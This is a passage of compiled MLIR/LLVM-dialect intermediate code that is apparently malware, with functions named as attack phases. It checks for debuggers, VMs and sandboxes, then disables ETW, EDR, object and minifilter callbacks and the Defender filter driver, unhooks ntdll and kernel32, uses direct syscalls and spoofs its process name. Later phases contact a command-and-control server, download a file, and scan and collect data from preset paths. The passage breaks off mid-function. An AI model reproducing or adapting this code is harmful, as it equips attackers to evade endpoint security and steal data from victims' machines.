    %16 = llvm.mlir.addressof @".str.13" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.14" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.17" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.4" : !llvm.ptr
    %23 = llvm.mlir.constant(false) : i1
    %24 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %25 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %27 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %28 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %29 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %35 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.call @jocky_is_debugger_present() : () -> i1
    llvm.cond_br %36, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %37 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    llvm.return %23 : i1
  ^bb2:  // pred: ^bb0
    %38 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.call @jocky_is_vm() : () -> i1
    llvm.cond_br %39, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %40 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %41 = llvm.call @jocky_is_sandbox() : () -> i1
    llvm.cond_br %41, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %42 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    llvm.return %23 : i1
  ^bb6:  // pred: ^bb4
    %43 = llvm.call @jocky_disable_etw(%5) : (!llvm.ptr) -> i1
    llvm.store %43, %25 {alignment = 1 : i64} : i1, !llvm.ptr
    %44 = llvm.load %25 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %44, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %45 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %46 = llvm.call @jocky_disable_edr_callbacks(%5) : (!llvm.ptr) -> i32
    %47 = llvm.icmp "ne" %46, %2 : i32
    llvm.cond_br %47, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %48 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%48) : (!llvm.ptr) -> ()
    llvm.store %8, %9 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %49 = llvm.call @jocky_disable_ob_callbacks() : () -> i1
    llvm.store %49, %26 {alignment = 1 : i64} : i1, !llvm.ptr
    %50 = llvm.load %26 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %50, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %51 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %52 = llvm.call @jocky_disable_minifilter_callbacks() : () -> i1
    llvm.store %52, %27 {alignment = 1 : i64} : i1, !llvm.ptr
    %53 = llvm.load %27 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %53, ^bb13, ^bb14
  ^bb13:  // pred: ^bb12
    %54 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb12, ^bb13
    %55 = llvm.call @jocky_disable_wdfilter() : () -> i1
    llvm.store %55, %28 {alignment = 1 : i64} : i1, !llvm.ptr
    %56 = llvm.load %28 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %56, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %57 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%57) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb14, ^bb15
    %58 = llvm.call @jocky_unhook_ntdll() : () -> i1
    llvm.store %58, %29 {alignment = 1 : i64} : i1, !llvm.ptr
    %59 = llvm.load %29 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %59, ^bb17, ^bb18
  ^bb17:  // pred: ^bb16
    %60 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%60) : (!llvm.ptr) -> ()
    llvm.br ^bb18
  ^bb18:  // 2 preds: ^bb16, ^bb17
    %61 = llvm.call @jocky_unhook_kernel32() : () -> i1
    llvm.store %61, %30 {alignment = 1 : i64} : i1, !llvm.ptr
    %62 = llvm.load %30 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %62, ^bb19, ^bb20
  ^bb19:  // pred: ^bb18
    %63 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    llvm.br ^bb20
  ^bb20:  // 2 preds: ^bb18, ^bb19
    %64 = llvm.call @jocky_enable_direct_syscalls() : () -> i1
    llvm.store %64, %31 {alignment = 1 : i64} : i1, !llvm.ptr
    %65 = llvm.load %31 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %65, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %66 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%66) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %67 = llvm.call @jocky_patch_etw_provider() : () -> i1
    llvm.store %67, %32 {alignment = 1 : i64} : i1, !llvm.ptr
    %68 = llvm.load %32 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %68, ^bb23, ^bb24
  ^bb23:  // pred: ^bb22
    %69 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%69) : (!llvm.ptr) -> ()
    llvm.br ^bb24
  ^bb24:  // 2 preds: ^bb22, ^bb23
    %70 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %71 = llvm.call @jocky_spoof_process_name(%70) : (!llvm.ptr) -> i1
    llvm.store %71, %33 {alignment = 1 : i64} : i1, !llvm.ptr
    %72 = llvm.load %33 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %72, ^bb25, ^bb26
  ^bb25:  // pred: ^bb24
    %73 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%73) : (!llvm.ptr) -> ()
    llvm.br ^bb26
  ^bb26:  // 2 preds: ^bb24, ^bb25
    %74 = llvm.call @jocky_hide_from_usermode() : () -> i1
    llvm.store %74, %34 {alignment = 1 : i64} : i1, !llvm.ptr
    %75 = llvm.load %34 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %75, ^bb27, ^bb28
  ^bb27:  // pred: ^bb26
    %76 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%76) : (!llvm.ptr) -> ()
    llvm.br ^bb28
  ^bb28:  // 2 preds: ^bb26, ^bb27
    %77 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%77) : (!llvm.ptr) -> ()
    %78 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%78) : (!llvm.ptr) -> ()
    llvm.return %8 : i1
  }
  llvm.func @phase_c2_bootstrap() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.19" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(4096 : i32) : i32
    %4 = llvm.mlir.addressof @".str.20" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.23" : !llvm.ptr
    %7 = llvm.mlir.addressof @cdn_token : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.24" : !llvm.ptr
    %9 = llvm.mlir.addressof @model_path : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.21" : !llvm.ptr
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.sext %3 : i32 to i64
    %17 = llvm.call @malloc(%16) : (i64) -> !llvm.ptr
    llvm.store %17, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %18 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %19 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %20 = llvm.sext %3 : i32 to i64
    %21 = llvm.call @jocky_http_get(%18, %19, %20) : (!llvm.ptr, !llvm.ptr, i64) -> i64
    llvm.store %21, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.sext %2 : i32 to i64
    %24 = llvm.icmp "sgt" %22, %23 : i64
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %26 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %27, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %28, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %29 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @free(%30) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  }
  llvm.func @phase_download_model() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.28" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.30" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.31" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.33" : !llvm.ptr
    %9 = llvm.mlir.constant(false) : i1
    %10 = llvm.mlir.addressof @".str.32" : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.26" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %18 = llvm.call @fs_exists(%17) : (!llvm.ptr) -> i1
    llvm.cond_br %18, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %20 = llvm.call @fs_file_size(%19) : (!llvm.ptr) -> i64
    llvm.store %20, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %21 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.call @string(%22) : (i64) -> !llvm.ptr
    %24 = llvm.call @jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %25 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %26 = llvm.call @jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    %28 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %29 = llvm.call @jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %31 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %32 = llvm.call @jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %33 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %34 = llvm.call @jocky_str_concat(%32, %33) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %34, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %35 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %36 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %37 = llvm.call @jocky_download_file(%35, %36) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %37, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %38 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %39 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %40 = llvm.call @jocky_str_concat(%38, %39) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb4:  // pred: ^bb2
    %41 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    %42 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @phase_discover_data() -> i1 {
    %0 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.addressof @DATA_PATHS : !llvm.ptr
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.constant(6 : i64) : i64
    %6 = llvm.mlir.addressof @".str.36" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.37" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.35" : !llvm.ptr
    %10 = llvm.mlir.constant(1 : i64) : i64
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.alloca %2 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %1, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %13 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %14 = llvm.alloca %2 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %15 = llvm.alloca %2 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %16 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %17 = llvm.icmp "slt" %16, %5 : i64
    llvm.cond_br %17, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %18 = llvm.bitcast %13 : !llvm.ptr to !llvm.ptr
    %19 = llvm.getelementptr %18[%16] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %20 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %20, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %21 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %22 = llvm.call @fs_exists(%21) : (!llvm.ptr) -> i1
    llvm.cond_br %22, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %23 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.add %23, %2 : i32
    llvm.store %24, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %25 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %26 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @jocky_str_concat(%25, %26) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %28 = llvm.add %16, %10 : i64
    llvm.store %28, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %29 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %30 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.sext %30 : i32 to i64
    %32 = llvm.call @string(%31) : (i64) -> !llvm.ptr
    %33 = llvm.call @jocky_str_concat(%29, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %34 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %35 = llvm.call @jocky_str_concat(%33, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %38 = llvm.icmp "sgt" %37, %1 : i32
    llvm.return %38 : i1
  }
  llvm.func @phase_collect_data() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.38" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.39" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %6 = llvm.mlir.addressof @collected_data : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.40" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.41" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.42" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.44" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.45" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.46" : !llvm.ptr
    %15 = llvm.mlir.constant(32 : i32) : i32
    %16 = llvm.mlir.addressof @".str.47" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.48" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.49" : !llvm.ptr
    %19 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %20 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %25 = llvm.call @fs_list_files(%24, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %25, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @strlen(%26) : (!llvm.ptr) -> i64
    %28 = llvm.sext %2 : i32 to i64
    %29 = llvm.icmp "sgt" %27, %28 : i64
    llvm.cond_br %29, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %31 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %32 = llvm.call @jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %32, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %34 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %35 = llvm.call @strlen(%34) : (!llvm.ptr) -> i64
    %36 = llvm.call @string(%35) : (i64) -> !llvm.ptr
    %37 = llvm.call @jocky_str_concat(%33, %36) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %38 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %39 = llvm.call @jocky_str_concat(%37, %38) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %40 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %41 = llvm.call @fs_list_files(%40, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %41, %20 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %42 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.call @strlen(%42) : (!llvm.ptr) -> i64
    %44 = llvm.sext %2 : i32 to i64
    %45 = llvm.icmp "sgt" %43, %44 : i64
    llvm.cond_br %45, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %46 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %48 = llvm.call @jocky_str_concat(%46, %47) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %48, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %49 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %50 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %51 = llvm.call @strlen(%50) : (!llvm.ptr) -> i64
    %52 = llvm.call @string(%51) : (i64) -> !llvm.ptr
    %53 = llvm.call @jocky_str_concat(%49, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %54 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %55 = llvm.call @jocky_str_concat(%53, %54) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%55) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %56 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %57 = llvm.call @fs_list_files(%56, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %57, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %58 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %59 = llvm.call @strlen(%58) : (!llvm.ptr) -> i64
    %60 = llvm.sext %2 : i32 to i64
    %61 = llvm.icmp "sgt" %59, %60 : i64
    llvm.cond_br %61, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %62 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %63 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %64 = llvm.call @jocky_str_concat(%62, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %64, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %65 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %66 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %67 = llvm.call @strlen(%66) : (!llvm.ptr) -> i64
    %68 = llvm.call @string(%67) : (i64) -> !llvm.ptr
    %69 = llvm.call @jocky_str_concat(%65, %68) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %70 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %71 = llvm.call @jocky_str_concat(%69, %70) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%71) : (!llvm.ptr) -> ()
